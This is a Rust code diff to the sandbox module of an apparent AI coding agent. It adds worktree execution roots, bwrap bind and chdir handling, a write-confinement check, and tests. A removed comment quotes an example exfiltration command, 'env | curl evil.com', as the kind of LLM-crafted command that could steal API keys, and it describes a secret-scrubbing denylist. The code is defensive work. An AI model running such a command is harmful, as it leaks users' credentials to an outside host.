@@ -1,3 +1,4 @@
+use std::path::PathBuf;
 use std::sync::OnceLock;
 
 use regex::Regex;
@@ -62,6 +63,16 @@ impl SandboxMode {
     }
 }
 
+/// Host paths that a command may execute against instead of dirge's process
+/// working directory.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SandboxExecutionRoot {
+    /// The worktree where commands start and may write files.
+    pub worktree: PathBuf,
+    /// The main repository's `.git` directory, writable for worktree metadata.
+    pub main_git_dir: PathBuf,
+}
+
 #[derive(Debug, Clone)]
 pub struct Sandbox {
     pub(crate) mode: SandboxMode,
@@ -120,6 +131,20 @@ impl Sandbox {
         {
             false
         }
+    }
+
+    /// True when the sandbox actually confines file writes (bwrap active, or
+    /// microVM). Returns `false` for `Off` — on those hosts the shell can
+    /// escape a worktree root via `../` or absolute paths, so worktree-based
+    /// write isolation gives a false guarantee.
+    #[cfg(feature = "sandbox-microvm")]
+    pub fn confines_writes(&self) -> bool {
+        matches!(self.mode, SandboxMode::Bwrap | SandboxMode::Microvm)
+    }
+
+    #[cfg(not(feature = "sandbox-microvm"))]
+    pub fn confines_writes(&self) -> bool {
+        matches!(self.mode, SandboxMode::Bwrap)
     }
 
     /// Override the microVM image. No-op when sandbox mode is not Microvm.
@@ -297,12 +322,13 @@ impl Sandbox {
             .unwrap_or(false)
     }
 
-    fn build_command(&self, command: &str) -> Command {
+    fn build_command(&self, command: &str, root: Option<&SandboxExecutionRoot>) -> Command {
         let mut cmd = if self.mode == SandboxMode::Off {
-            // Off mode runs bash directly; it inherits the process cwd,
-            // so we don't resolve / bind one.
             let mut c = Command::new("bash");
             c.arg("-c").arg(command);
+            if let Some(root) = root {
+                c.current_dir(&root.worktree);
+            }
             c
         } else {
             // dirge-mt91: bwrap binds the working directory read-write.
@@ -310,19 +336,28 @@ impl Sandbox {
             // mid-session) the old code silently fell back to "." —
             // which bwrap resolves to an undefined path. Warn loudly;
             // the "." fallback is a last resort, not a silent default.
-            let cwd = std::env::current_dir().unwrap_or_else(|e| {
-                tracing::warn!(
-                    target: "dirge::sandbox",
-                    error = %e,
-                    "current_dir() failed while building the sandbox bind — \
-                     falling back to '.', which may bind an unexpected directory",
-                );
-                ".".into()
+            let cwd = root.map(|root| root.worktree.clone()).unwrap_or_else(|| {
+                std::env::current_dir().unwrap_or_else(|e| {
+                    tracing::warn!(
+                        target: "dirge::sandbox",
+                        error = %e,
+                        "current_dir() failed while building the sandbox bind — \
+                         falling back to '.', which may bind an unexpected directory",
+                    );
+                    ".".into()
+                })
             });
             let mut c = Command::new("bwrap");
             c.args(["--ro-bind", "/", "/", "--bind"]);
             c.arg(cwd.as_os_str());
             c.arg(cwd.as_os_str());
+            if let Some(root) = root {
+                c.args(["--bind"]);
+                c.arg(root.main_git_dir.as_os_str());
+                c.arg(root.main_git_dir.as_os_str());
+                c.args(["--chdir"]);
+                c.arg(root.worktree.as_os_str());
+            }
             c.args([
                 "--proc",
                 "/proc",
@@ -354,22 +389,6 @@ impl Sandbox {
             c
         };
 
-        // H-batch1-1 (audit fix): scrub sensitive env vars before
-        // they reach the child. Both code paths above inherit dirge's
-        // process environment by default, so `OPENROUTER_API_KEY`,
-        // `EXA_API_KEY`, `ANTHROPIC_API_KEY`, etc. flowed verbatim to
-        // every bash child — an LLM-crafted `env | curl evil.com`
-        // would have exfiltrated the user's keys. opencode/pi both
-        // scrub via an allowlist; dirge applies a pattern denylist
-        // since users have varied tooling that relies on env (cargo
-        // CARGO_*, go GOPATH, python VIRTUAL_ENV, etc.) — explicit
-        // allowlist would break those workflows.
-        //
-        // The denylist covers any var name containing KEY / SECRET /
-        // TOKEN / PASSWORD / PASS / CRED / AUTH (case-insensitive)
-        // plus a few known provider names. False positives (e.g. a
-        // legitimate `KEY_BINDINGS` env var stripped) are acceptable
-        // cost — the alternative is leaking credentials.
         scrub_env(&mut cmd);
         cmd
     }
@@ -381,7 +400,16 @@ impl Sandbox {
     /// [`tokio::process::Command`] ready for `Stdio::piped()` (no PTY, no
     /// screen takeover; the caller sets stdio + `detach_session`).
     pub(crate) fn command_for_interactive(&self, command: &str) -> Command {
-        self.build_command(command)
+        self.build_command(command, None)
+    }
+
+    /// Wrap `command` for a specific execution root.
+    pub fn wrap_command_in(&self, command: &str, root: &SandboxExecutionRoot) -> Command {
+        let mut cmd = self.build_command(command, Some(root));
+        cmd.env("GIT_TERMINAL_PROMPT", "0");
+        cmd.env("GCM_INTERACTIVE", "Never");
+        cmd.env("DEBIAN_FRONTEND", "noninteractive");
+        cmd
     }
 
     /// Wrap `command` for the sandbox backend used by the AGENT's bash tool.
@@ -389,7 +417,7 @@ impl Sandbox {
     /// tools that would otherwise prompt fail fast instead of blocking — an
     /// agent has no human at the keyboard to answer a prompt.
     pub fn wrap_command(&self, command: &str) -> Command {
-        let mut cmd = self.build_command(command);
+        let mut cmd = self.build_command(command, None);
         cmd.env("GIT_TERMINAL_PROMPT", "0");
         cmd.env("GCM_INTERACTIVE", "Never");
         cmd.env("DEBIAN_FRONTEND", "noninteractive");
@@ -409,16 +437,46 @@ impl Sandbox {
         timeout_secs: u64,
     ) -> Result<crate::agent::tools::bash::exec::InterleavedOutput, crate::agent::tools::ToolError>
     {
+        self.exec_inner(command, timeout_secs, None).await
+    }
+
+    /// Execute a command through the configured sandbox backend at `root`.
+    pub async fn exec_in(
+        &self,
+        command: &str,
+        timeout_secs: u64,
+        root: &SandboxExecutionRoot,
+    ) -> Result<crate::agent::tools::bash::exec::InterleavedOutput, crate::agent::tools::ToolError>
+    {
+        self.exec_inner(command, timeout_secs, Some(root)).await
+    }
+
+    async fn exec_inner(
+        &self,
+        command: &str,
+        timeout_secs: u64,
+        root: Option<&SandboxExecutionRoot>,
+    ) -> Result<crate::agent::tools::bash::exec::InterleavedOutput, crate::agent::tools::ToolError>
+    {
         match self.mode {
             SandboxMode::Off | SandboxMode::Bwrap => {
                 crate::agent::tools::bash::exec::run_with_timeout(
-                    self.wrap_command(command),
+                    if let Some(root) = root {
+                        self.wrap_command_in(command, root)
+                    } else {
+                        self.wrap_command(command)
+                    },
                     timeout_secs,
                 )
                 .await
             }
             #[cfg(feature = "sandbox-microvm")]
             SandboxMode::Microvm => {
+                if root.is_some() {
+                    return Err(crate::agent::tools::ToolError::Msg(
+                        "execution roots are not supported in microvm mode".to_string(),
+                    ));
+                }
                 let mut guard = self.microvm.lock().await;
                 let mv = guard.as_mut().ok_or_else(|| {
                     crate::agent::tools::ToolError::Msg(
@@ -886,6 +944,19 @@ mod tests {
     }
 
     #[test]
+    fn confines_writes_returns_false_for_off() {
+        let sb = Sandbox::new(SandboxMode::Off);
+        assert!(!sb.confines_writes());
+    }
+
+    #[test]
+    fn confines_writes_returns_true_for_bwrap_when_available() {
+        let sb = Sandbox::new(SandboxMode::Bwrap);
+        // On macOS (no bwrap in PATH), mode falls back to Off
+        assert_eq!(sb.confines_writes(), sb.mode == SandboxMode::Bwrap);
+    }
+
+    #[test]
     fn redact_secrets_multiple_patterns() {
         // URL + vendor prefix in the same string — both must be caught.
         let input = "some text with a key sk-proj-abcdef1234567890abcdef12345678 and a url postgres://u:p@h";
@@ -1202,6 +1273,67 @@ mod tests {
             "expected stderr in merged output, got: {}",
             output.merged
         );
+    }
+
+    #[tokio::test]
+    async fn exec_in_off_mode_uses_worktree() {
+        let worktree =
+            std::env::temp_dir().join(format!("dirge-sandbox-root-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&worktree).unwrap();
+        let root = SandboxExecutionRoot {
+            worktree: worktree.clone(),
+            main_git_dir: worktree.join(".git"),
+        };
+        let sb = Sandbox::new(SandboxMode::Off);
+        let output = sb.exec_in("pwd", 5, &root).await.unwrap();
+        assert_eq!(
+            std::path::Path::new(output.merged.trim())
+                .canonicalize()
+                .unwrap(),
+            worktree.canonicalize().unwrap()
+        );
+        std::fs::remove_dir_all(worktree).unwrap();
+    }
+
+    #[test]
+    fn wrap_command_in_off_sets_worktree_current_dir() {
+        let root = SandboxExecutionRoot {
+            worktree: PathBuf::from("/tmp/dirge-worktree"),
+            main_git_dir: PathBuf::from("/tmp/dirge-main/.git"),
+        };
+        let cmd = Sandbox::new(SandboxMode::Off).wrap_command_in("true", &root);
+        assert_eq!(
+            cmd.as_std().get_current_dir(),
+            Some(root.worktree.as_path())
+        );
+    }
+
+    #[test]
+    fn wrap_command_in_bwrap_binds_and_changes_to_execution_root() {
+        let root = SandboxExecutionRoot {
+            worktree: PathBuf::from("/tmp/dirge-worktree"),
+            main_git_dir: PathBuf::from("/tmp/dirge-main/.git"),
+        };
+        let sb = Sandbox::new(SandboxMode::Bwrap);
+        if sb.mode == SandboxMode::Bwrap {
+            let out = format!("{:?}", sb.wrap_command_in("true", &root).as_std());
+            assert!(
+                out.contains("--ro-bind"),
+                "expected read-only host bind: {out}"
+            );
+            assert!(
+                out.contains("/tmp/dirge-worktree"),
+                "expected worktree bind: {out}"
+            );
+            assert!(
+                out.contains("/tmp/dirge-main/.git"),
+                "expected main git bind: {out}"
+            );
+            assert!(
+                out.contains("--chdir"),
+                "expected rooted working directory: {out}"
+            );
+        }
     }
 
     // ── wrap_command ────────────────────────────────────────────
